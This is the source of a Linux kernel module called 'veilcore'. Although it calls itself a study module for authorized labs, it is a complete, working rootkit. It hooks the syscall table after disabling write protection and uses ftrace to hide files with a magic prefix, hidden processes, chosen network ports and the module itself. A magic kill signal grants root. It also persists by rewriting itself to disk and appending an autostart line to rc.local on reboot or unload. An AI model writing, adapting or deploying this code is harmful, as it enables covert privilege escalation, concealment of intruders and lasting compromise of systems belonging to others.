// SPDX-License-Identifier: GPL-2.0
/*
 * veilcore - observation-layer control module.
 *
 * Dual-channel hooks: syscall-table (getdents/getdents64/kill/reboot) plus
 * ftrace (network seq_show family). Six capabilities: magic-prefix file
 * hiding, process hiding, module self-hiding, port hiding, privilege
 * elevation and shutdown write-back persistence.
 */
#include "core.h"
#include "config.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("veilcore project");
MODULE_DESCRIPTION("kernel hooking study module for authorized labs");

/* ------------------------------------------------------------------ */
/* Globals                                                            */
/* ------------------------------------------------------------------ */
static char *ko_path = DEFAULT_KO_PATH;
module_param(ko_path, charp, 0444);
MODULE_PARM_DESC(ko_path, "path used for the write-back .ko cache");

static unsigned long *veil_sys_call_table;
static unsigned long saved_cr0;

static int module_hidden;
static int net_hooks_ok;
static int ko_ready;
static struct list_head *module_previous;

static unsigned short hidden_ports[MAX_HIDDEN_PORTS];
static unsigned int hidden_port_count;
static DEFINE_SPINLOCK(port_lock);

static char *self_ko;
static loff_t self_ko_size;

/* ------------------------------------------------------------------ */
/* Syscall hook prototypes (dual convention)                          */
/* ------------------------------------------------------------------ */
#ifdef PTREGS_SYSCALL
typedef asmlinkage long (*veil_ptregs_fn)(const struct pt_regs *);

static asmlinkage long veil_getdents(const struct pt_regs *);
static asmlinkage long veil_getdents64(const struct pt_regs *);
static asmlinkage long veil_kill(const struct pt_regs *);
static asmlinkage long veil_reboot(const struct pt_regs *);

static veil_ptregs_fn orig_getdents;
static veil_ptregs_fn orig_getdents64;
static veil_ptregs_fn orig_kill;
static veil_ptregs_fn orig_reboot;
#else
typedef asmlinkage long (*orig_getdents_t)(unsigned int,
					   struct linux_dirent __user *,
					   unsigned int);
typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
					     struct linux_dirent64 __user *,
					     unsigned int);
typedef asmlinkage long (*orig_kill_t)(pid_t, int);
typedef asmlinkage long (*orig_reboot_t)(int, int, unsigned int,
					 void __user *);

static asmlinkage long veil_getdents(unsigned int fd,
				     struct linux_dirent __user *dirent,
				     unsigned int count);
static asmlinkage long veil_getdents64(unsigned int fd,
				       struct linux_dirent64 __user *dirent,
				       unsigned int count);
static asmlinkage long veil_kill(pid_t pid, int sig);
static asmlinkage long veil_reboot(int magic1, int magic2, unsigned int cmd,
				   void __user *arg);

static orig_getdents_t orig_getdents;
static orig_getdents64_t orig_getdents64;
static orig_kill_t orig_kill;
static orig_reboot_t orig_reboot;
#endif

/* ------------------------------------------------------------------ */
/* Module self-hiding (definitions live further down)                 */
/* ------------------------------------------------------------------ */
static void module_hide(void);
static void module_show(void);

/* ------------------------------------------------------------------ */
/* Process visibility                                                 */
/* ------------------------------------------------------------------ */
static int is_invisible(pid_t pid)
{
	struct task_struct *task;
	int ret = 0;

	if (pid == 0)
		return 0;

	rcu_read_lock();
	for_each_process(task) {
		if (task->pid == pid) {
			ret = !!(task->flags & PF_INVISIBLE);
			break;
		}
	}
	rcu_read_unlock();
	return ret;
}

/* ------------------------------------------------------------------ */
/* Port hiding (seq_show may run in softirq -> bottom-half lock)      */
/* ------------------------------------------------------------------ */
static int is_port_hidden(unsigned short port)
{
	unsigned int i;
	int ret = 0;

	spin_lock_bh(&port_lock);
	for (i = 0; i < hidden_port_count; i++) {
		if (hidden_ports[i] == port) {
			ret = 1;
			break;
		}
	}
	spin_unlock_bh(&port_lock);
	return ret;
}

static void toggle_port(unsigned short port)
{
	unsigned int i;

	spin_lock_bh(&port_lock);
	for (i = 0; i < hidden_port_count; i++) {
		if (hidden_ports[i] == port) {
			/* swap with the last element and shrink */
			hidden_ports[i] = hidden_ports[hidden_port_count - 1];
			hidden_port_count--;
			spin_unlock_bh(&port_lock);
			return;
		}
	}
	if (hidden_port_count < MAX_HIDDEN_PORTS)
		hidden_ports[hidden_port_count++] = port;
	/* table full: silently dropped */
	spin_unlock_bh(&port_lock);
}

/* ------------------------------------------------------------------ */
/* Privilege elevation                                                */
/* ------------------------------------------------------------------ */
static void give_root(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29, 0)
	current->uid = 0;
	current->gid = 0;
	current->euid = 0;
	current->egid = 0;
	current->suid = 0;
	current->sgid = 0;
	current->fsuid = 0;
	current->fsgid = 0;
#else
	struct cred *new = prepare_creds();

	if (!new)
		return;
	veil_set_cred_zero(new);
	commit_creds(new);
#endif
}

/* ------------------------------------------------------------------ */
/* getdents filtering                                                 */
/* ------------------------------------------------------------------ */
static int should_hide_dentry(const char *name, unsigned long namelen,
			      int is_proc)
{
	size_t plen;

	if (is_proc) {
		pid_t pid = (pid_t)simple_strtoul(name, NULL, 10);

		if (is_invisible(pid))
			return 1;
	}

	plen = strlen(MAGIC_PREFIX);
	if (namelen >= plen && memcmp(name, MAGIC_PREFIX, plen) == 0)
		return 1;

	/* d_name is a C string: stop at the first NUL, do not require
	 * namelen == strlen(MODULE_DISPLAY_NAME). */
	if (READ_ONCE(module_hidden) &&
	    strcmp(name, MODULE_DISPLAY_NAME) == 0)
		return 1;

	return 0;
}

/*
 * Shared walk-and-compact body. buf_size is the original return value,
 * kdirent the kernel copy. Returns the new (possibly shorter) length.
 */
static long veil_compact_dirents(void *kdirent, long buf_size, int is64,
				 int is_proc)
{
	unsigned long off = 0;
	void *prev = NULL;

	while (off < (unsigned long)buf_size) {
		unsigned short reclen;
		char *name;
		unsigned long namelen;
		int hide;

		if (is64) {
			struct linux_dirent64 *dir =
				(void *)((char *)kdirent + off);

			reclen = dir->d_reclen;
			name = dir->d_name;
			namelen = reclen - offsetof(struct linux_dirent64,
						    d_name);
		} else {
			struct linux_dirent *dir =
				(void *)((char *)kdirent + off);

			reclen = dir->d_reclen;
			name = dir->d_name;
			namelen = reclen - offsetof(struct linux_dirent,
						    d_name);
		}
		hide = should_hide_dentry(name, namelen, is_proc);

		if (hide) {
			if (off == 0) {
				/* first entry: shift everything over it and
				 * re-read the new first entry next round */
				buf_size -= reclen;
				memmove(kdirent, (char *)kdirent + reclen,
					buf_size);
				continue;
			}
			/* not the first: fold into the previous record */
			if (prev)
				*(unsigned short *)prev += reclen;
			off += reclen;
			continue;
		}

		prev = (char *)kdirent + off;
		off += reclen;
	}

	return buf_size;
}

#ifdef PTREGS_SYSCALL
static asmlinkage long veil_getdents64(const struct pt_regs *pt_regs)
{
	unsigned int fd = (unsigned int)SYSCALL_ARG1(pt_regs);
	struct linux_dirent64 __user *dirent =
		(struct linux_dirent64 __user *)SYSCALL_ARG2(pt_regs);
	long ret = orig_getdents64(pt_regs);
#else
static asmlinkage long veil_getdents64(unsigned int fd,
				       struct linux_dirent64 __user *dirent,
				       unsigned int count)
{
	long ret = orig_getdents64(fd, dirent, count);
#endif
	long orig_ret = ret;
	struct inode *d_inode;
	char *kdirent;
	long new_ret;
	int is_proc = 0;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (!kdirent)
		return orig_ret;

	if (copy_from_user(kdirent, dirent, ret)) {
		kfree(kdirent);
		return orig_ret;
	}

	d_inode = GET_INODE(fd);
	if (d_inode && d_inode->i_ino == PROC_ROOT_INO &&
	    !MAJOR(d_inode->i_rdev))
		is_proc = 1;

	new_ret = veil_compact_dirents(kdirent, ret, 1, is_proc);

	if (copy_to_user(dirent, kdirent, new_ret))
		new_ret = orig_ret;	/* user buffer untouched: keep its length */

	kfree(kdirent);
	return new_ret;
}

#ifdef PTREGS_SYSCALL
static asmlinkage long veil_getdents(const struct pt_regs *pt_regs)
{
	unsigned int fd = (unsigned int)SYSCALL_ARG1(pt_regs);
	struct linux_dirent __user *dirent =
		(struct linux_dirent __user *)SYSCALL_ARG2(pt_regs);
	long ret = orig_getdents(pt_regs);
#else
static asmlinkage long veil_getdents(unsigned int fd,
				     struct linux_dirent __user *dirent,
				     unsigned int count)
{
	long ret = orig_getdents(fd, dirent, count);
#endif
	long orig_ret = ret;
	struct inode *d_inode;
	char *kdirent;
	long new_ret;
	int is_proc = 0;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (!kdirent)
		return orig_ret;

	if (copy_from_user(kdirent, dirent, ret)) {
		kfree(kdirent);
		return orig_ret;
	}

	d_inode = GET_INODE(fd);
	if (d_inode && d_inode->i_ino == PROC_ROOT_INO &&
	    !MAJOR(d_inode->i_rdev))
		is_proc = 1;

	new_ret = veil_compact_dirents(kdirent, ret, 0, is_proc);

	if (copy_to_user(dirent, kdirent, new_ret))
		new_ret = orig_ret;

	kfree(kdirent);
	return new_ret;
}

/* ------------------------------------------------------------------ */
/* kill(2) control plane                                              */
/* ------------------------------------------------------------------ */
#ifdef PTREGS_SYSCALL
static asmlinkage long veil_kill(const struct pt_regs *pt_regs)
{
	pid_t pid = (pid_t)SYSCALL_ARG1(pt_regs);
	int sig = (int)SYSCALL_ARG2(pt_regs);
#else
static asmlinkage long veil_kill(pid_t pid, int sig)
{
#endif
	switch (sig) {
	case SIG_PROC_TOGGLE: {
		struct task_struct *task;

		rcu_read_lock();
		for_each_process(task) {
			if (task->pid == pid) {
				task->flags ^= PF_INVISIBLE;
				rcu_read_unlock();
				return 0;
			}
		}
		rcu_read_unlock();
		return -ESRCH;
	}
	case SIG_ROOT_ELEVATE:
		give_root();
		return 0;
	case SIG_MOD_VISIBILITY:
		READ_ONCE(module_hidden) ? module_show() : module_hide();
		return 0;
	case SIG_PORT_TOGGLE:
		if (pid >= 1 && pid <= 65535)
			toggle_port((unsigned short)pid);
		return 0;
	default:
#ifdef PTREGS_SYSCALL
		return orig_kill(pt_regs);
#else
		return orig_kill(pid, sig);
#endif
	}
}

/* ------------------------------------------------------------------ */
/* reboot persistence trigger                                         */
/* ------------------------------------------------------------------ */
static void do_persistence(void);

#ifdef PTREGS_SYSCALL
static asmlinkage long veil_reboot(const struct pt_regs *pt_regs)
{
	if (ko_ready)
		do_persistence();
	return orig_reboot(pt_regs);
}
#else
static asmlinkage long veil_reboot(int magic1, int magic2, unsigned int cmd,
				   void __user *arg)
{
	if (ko_ready)
		do_persistence();
	return orig_reboot(magic1, magic2, cmd, arg);
}
#endif

/* ------------------------------------------------------------------ */
/* Module self-hiding                                                 */
/* ------------------------------------------------------------------ */
static void module_hide(void)
{
	if (READ_ONCE(module_hidden))
		return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	WRITE_ONCE(module_hidden, 1);
}

static void module_show(void)
{
	if (!READ_ONCE(module_hidden))
		return;
	list_add(&THIS_MODULE->list, module_previous);
	WRITE_ONCE(module_hidden, 0);
}

static void tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

/* ------------------------------------------------------------------ */
/* Persistence subsystem                                              */
/* ------------------------------------------------------------------ */
/* strnstr may not be exported on every kernel: local sliding-window
 * equivalent instead of depending on it. */
static int veil_strnstr(const char *hay, const char *needle, size_t len)
{
	size_t nl = strlen(needle);
	size_t i;

	if (nl == 0 || len < nl)
		return 0;
	for (i = 0; i <= len - nl; i++) {
		if (hay[i] == needle[0] &&
		    memcmp(&hay[i], needle, nl) == 0)
			return 1;
	}
	return 0;
}

/* Returns bytes read (>=0) or a negative errno; *out_size receives the
 * file length. */
static long read_file(const char *path, char **out_buf, loff_t *out_size)
{
	struct file *file;
	struct inode *inode;
	char *buf;
	loff_t size, pos = 0;
	ssize_t rd;

	*out_buf = NULL;
	*out_size = 0;

	file = filp_open(path, O_RDONLY, 0);
	if (IS_ERR(file))
		return PTR_ERR(file);

	inode = FILE_INODE(file);
	if (!inode) {
		filp_close(file, NULL);
		return -EINVAL;
	}
	size = i_size_read(inode);
	if (size <= 0) {
		filp_close(file, NULL);
		return -EINVAL;
	}

	buf = kmalloc(size, GFP_KERNEL);
	if (!buf) {
		filp_close(file, NULL);
		return -ENOMEM;
	}

	while (pos < size) {
		rd = veil_kernel_read(file, buf + pos, size - pos, &pos);
		if (rd < 0) {
			kfree(buf);
			filp_close(file, NULL);
			return rd;
		}
		if (rd == 0)
			break;
	}

	filp_close(file, NULL);
	*out_buf = buf;
	*out_size = pos;
	return pos;
}

static long write_file(const char *path, const char *buf, loff_t len)
{
	struct file *file;
	loff_t pos = 0;
	ssize_t wr;

	file = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(file))
		return PTR_ERR(file);

	while (pos < len) {
		wr = veil_kernel_write(file, buf + pos, len - pos, &pos);
		if (wr < 0) {
			filp_close(file, NULL);
			return wr;
		}
		if (wr == 0)
			break;
	}

	filp_close(file, NULL);
	return pos;
}

static long load_self_ko(void)
{
	long ret = read_file(ko_path, &self_ko, &self_ko_size);

	ko_ready = (ret >= 0);
	if (!ko_ready)
		self_ko = NULL;
	return ret;
}

static long write_self_ko(void)
{
	if (!self_ko || self_ko_size <= 0)
		return -EINVAL;
	return write_file(ko_path, self_ko, self_ko_size);
}

static long setup_autostart(void)
{
	char script[256];
	char *rc = NULL;
	loff_t rc_size = 0;
	long ret;
	int len;

	len = snprintf(script, sizeof(script),
		       "#!/bin/sh\ninsmod %s ko_path=%s\n",
		       ko_path, ko_path);
	if (len <= 0 || len >= sizeof(script))
		return -EINVAL;

	ret = write_file(PERSISTENCE_SCRIPT, script, len);
	if (ret < 0)
		return ret;

	ret = read_file(RC_LOCAL_PATH, &rc, &rc_size);
	if (ret >= 0) {
		int present = veil_strnstr(rc, PERSISTENCE_SCRIPT, rc_size);

		kfree(rc);
		if (present)
			return 0;
	}

	/* append the autostart line (0755 keeps rc.local executable) */
	{
		struct file *file = filp_open(RC_LOCAL_PATH,
					       O_WRONLY | O_CREAT | O_APPEND,
					       0755);
		char line[256];
		loff_t pos = 0;
		int n = snprintf(line, sizeof(line), "\n%s\n",
				 PERSISTENCE_SCRIPT);

		if (IS_ERR(file))
			return PTR_ERR(file);
		while (pos < n) {
			ssize_t wr = veil_kernel_write(file, line + pos,
						       n - pos, &pos);

			if (wr <= 0)
				break;
		}
		filp_close(file, NULL);
	}
	return 0;
}

static void do_persistence(void)
{
	/* order matters: the .ko image first, the autostart hook second */
	write_self_ko();
	setup_autostart();
}

static int veil_reboot_notify(struct notifier_block *nb, unsigned long action,
			      void *data)
{
	if (ko_ready)
		do_persistence();
	return NOTIFY_DONE;
}

static struct notifier_block veil_reboot_nb = {
	.notifier_call = veil_reboot_notify,
	.priority = INT_MAX,
};

/* ------------------------------------------------------------------ */
/* Network seq_show hooks (ftrace channel)                            */
/* ------------------------------------------------------------------ */
static int (*orig_tcp4_seq_show)(struct seq_file *, void *);
static int (*orig_tcp6_seq_show)(struct seq_file *, void *);
static int (*orig_udp4_seq_show)(struct seq_file *, void *);
static int (*orig_udp6_seq_show)(struct seq_file *, void *);

static int veil_sock_hidden(void *v)
{
	struct sock *sk = (struct sock *)v;
	struct inet_sock *inet;
	unsigned short sport, dport;

	if (v == SEQ_START_TOKEN)
		return 0;

	inet = inet_sk(sk);
	if (!inet)
		return 0;	/* NULL socket is a miss, never a hide */

	sport = ntohs(INET_SPORT(inet));
	dport = ntohs(INET_DPORT(inet));
	return is_port_hidden(sport) || is_port_hidden(dport);
}

static int veil_tcp4_seq_show(struct seq_file *seq, void *v)
{
	if (veil_sock_hidden(v))
		return 0;
	return orig_tcp4_seq_show(seq, v);
}

static int veil_tcp6_seq_show(struct seq_file *seq, void *v)
{
	if (veil_sock_hidden(v))
		return 0;
	return orig_tcp6_seq_show(seq, v);
}

static int veil_udp4_seq_show(struct seq_file *seq, void *v)
{
	if (veil_sock_hidden(v))
		return 0;
	return orig_udp4_seq_show(seq, v);
}

static int veil_udp6_seq_show(struct seq_file *seq, void *v)
{
	if (veil_sock_hidden(v))
		return 0;
	return orig_udp6_seq_show(seq, v);
}

static struct ftrace_hook net_hooks[] = {
	HOOK("tcp4_seq_show", veil_tcp4_seq_show, &orig_tcp4_seq_show),
	HOOK("tcp6_seq_show", veil_tcp6_seq_show, &orig_tcp6_seq_show),
	HOOK("udp4_seq_show", veil_udp4_seq_show, &orig_udp4_seq_show),
	HOOK("udp6_seq_show", veil_udp6_seq_show, &orig_udp6_seq_show),
};

/* ------------------------------------------------------------------ */
/* Syscall table patching (CR0 + PTE on every write)                  */
/* ------------------------------------------------------------------ */
static int write_syscall_table(int install)
{
	unsigned int level;
	pte_t *pte;
	pte_t orig_pte;
	int pte_saved = 0;

	/* 1-2: clear CR0.WP (saved_cr0 captured during init) */
	veil_write_cr0(saved_cr0 & ~0x00010000UL);

	/* 3: make the table page itself writable, saving the original PTE */
	pte = lookup_address((unsigned long)veil_sys_call_table, &level);
	if (pte) {
		orig_pte = *pte;
		*pte = pte_set_flags(orig_pte, _PAGE_RW);
		pte_saved = 1;
	}

	/* 4: write / restore the four entries */
	if (install) {
		WRITE_ONCE(veil_sys_call_table[__NR_getdents],
			   (unsigned long)veil_getdents);
		WRITE_ONCE(veil_sys_call_table[__NR_getdents64],
			   (unsigned long)veil_getdents64);
		WRITE_ONCE(veil_sys_call_table[__NR_kill],
			   (unsigned long)veil_kill);
		WRITE_ONCE(veil_sys_call_table[__NR_reboot],
			   (unsigned long)veil_reboot);
	} else {
		WRITE_ONCE(veil_sys_call_table[__NR_getdents],
			   (unsigned long)orig_getdents);
		WRITE_ONCE(veil_sys_call_table[__NR_getdents64],
			   (unsigned long)orig_getdents64);
		WRITE_ONCE(veil_sys_call_table[__NR_kill],
			   (unsigned long)orig_kill);
		WRITE_ONCE(veil_sys_call_table[__NR_reboot],
			   (unsigned long)orig_reboot);
	}

	/* 5-6: restore PTE then CR0, never leaving the page writable */
	if (pte_saved)
		*pte = orig_pte;
	veil_write_cr0(saved_cr0);

	return 0;
}

static int setup_syscall_hooks(void)
{
	orig_getdents = (typeof(orig_getdents))
		veil_sys_call_table[__NR_getdents];
	orig_getdents64 = (typeof(orig_getdents64))
		veil_sys_call_table[__NR_getdents64];
	orig_kill = (typeof(orig_kill))veil_sys_call_table[__NR_kill];
	orig_reboot = (typeof(orig_reboot))veil_sys_call_table[__NR_reboot];

	return write_syscall_table(1);
}

static void remove_syscall_hooks(void)
{
	write_syscall_table(0);
}

/* ------------------------------------------------------------------ */
/* module_init / module_exit                                          */
/* ------------------------------------------------------------------ */
static int __init veilcore_init(void)
{
	int ret;

	/* 1: cache the running image; failure only disables persistence */
	ret = (int)load_self_ko();
	if (ret < 0)
		pr_warn("veilcore: self cache unavailable (%d), persistence disabled\n",
			ret);

	/* 2: symbol resolution + syscall table; on failure nothing is
	 * installed yet, so a plain -1 exit leaves no half-hidden module */
	ret = veil_init_kallsyms();
	if (ret < 0) {
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
		pr_err("veilcore: kallsyms bootstrap failed (%d)\n", ret);
		return -1;
#else
		pr_warn("veilcore: kallsyms bootstrap failed (%d), ftrace disabled\n",
			ret);
#endif
	}

	veil_sys_call_table = get_syscall_table();
	if (!veil_sys_call_table) {
		pr_err("veilcore: syscall table not found\n");
		return -1;
	}

	/* 3 */
	saved_cr0 = veil_read_cr0();

	/* 4: write_syscall_table() restores PTE/CR0 before any failure */
	ret = setup_syscall_hooks();
	if (ret < 0) {
		pr_err("veilcore: syscall hook install failed\n");
		return -1;
	}

	/* 5: network ftrace is non-fatal; fh_install_hooks already rolled
	 * back any partial install on failure */
	ret = fh_install_hooks(net_hooks, ARRAY_SIZE(net_hooks));
	net_hooks_ok = (ret == 0);
	if (!net_hooks_ok)
		pr_warn("veilcore: network hooks unavailable (%d), port hiding disabled\n",
			ret);

	/* 6 */
	ret = register_reboot_notifier(&veil_reboot_nb);
	if (ret < 0) {
		pr_err("veilcore: reboot notifier failed (%d)\n", ret);
		if (net_hooks_ok) {
			fh_remove_hooks(net_hooks, ARRAY_SIZE(net_hooks));
			net_hooks_ok = 0;
		}
		remove_syscall_hooks();
		return -1;
	}

	/* 7: hide is the LAST step of the success path only */
	module_hide();
	tidy();

	return 0;
}

static void __exit veilcore_exit(void)
{
	unregister_reboot_notifier(&veil_reboot_nb);

	if (ko_ready)
		do_persistence();

	if (net_hooks_ok)
		fh_remove_hooks(net_hooks, ARRAY_SIZE(net_hooks));

	if (veil_sys_call_table)
		remove_syscall_hooks();

	kfree(self_ko);
	self_ko = NULL;
}

module_init(veilcore_init);
module_exit(veilcore_exit);
